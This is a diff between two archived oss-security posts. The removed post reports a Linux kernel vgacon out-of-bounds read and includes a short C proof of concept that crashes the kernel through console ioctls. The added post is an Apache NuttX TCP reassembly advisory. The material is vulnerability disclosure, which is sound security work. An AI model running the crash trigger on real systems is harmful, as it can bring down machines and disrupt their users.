@@ -1,44 +1,28 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/09/16/1
-Message-ID: <CA+-U7QDboXJEpHXNa5mk-pOyBbKw63t8WefV5cmr+Hi8KsWeOQ@mail.gmail.com>
-Date: Wed, 16 Sep 2020 16:19:46 +0800
-From: NopNop Nop <nopitydays@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/12/09/5
+Message-ID: <837a9c7055b76fa0887a07a13f7ae077c8c39387.camel@apache.org>
+Date: Wed, 09 Dec 2020 08:08:48 -0800
+From: Brennan Ashton <btashton@...che.org>
 To: oss-security@...ts.openwall.com
-Subject: Linux Kernel: out-of-bounds reading in vgacon_scrolldelta
+Subject: CVE-2020-17529: Apache NuttX (incubating) Out of Bound Write from invalid fragmentation offset value specified in the IP header
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+Description:
+Out-of-bounds Write vulnerability in TCP Stack of Apache Software
+Foundation Apache NuttX (incubating) allows attacker to corrupt memory
+by supplying and invalid fragmentation offset value specified in the IP
+header.  This is only impacts builds with both CONFIG_EXPERIMENTAL and
+CONFIG_NET_TCP_REASSEMBLY build flags enabled.
 
-We found a out-of-bounds reading in vgacon_scrolldelta. This BUG is caused
-by "soff" being negative after VT_RESIZE.
+This issue affects:
+Apache Software Foundation Apache NuttX (incubating) versions prior to
+9.1.1 AND 10.0.0.
 
-Our PoC (panic with CONFIG_KASAN=y):
+This issue is also known as AMNESIA:33 CVE-2020-17438
 
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <sys/ioctl.h>
-#include <fcntl.h>
+Credit:
+Apache NuttX would like to thank Forescout for reporting the issue
 
-int main(int argc, char** argv)
-{
-        int fd = open("/dev/tty1", O_RDWR, 0);
-
-        unsigned short size[3] = {4, 0x254, 0};
-        ioctl(fd, 0x5609, size);
-
-        for (int i = 0; i < 110; i++) {
-                write(fd, "\x0a", 1);
-        }
-        signed int args[3] = {13, -0x400, 0};
-        ioctl(fd, 0x541c, args);
-}
-
-Here is the commit to patch this BUG:
-https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=973c096f6a85e5b5f2a295126ba6928d9a6afd45
-
-Regards,
-Nop
+Thanks you,
+Brennan Ashton
 
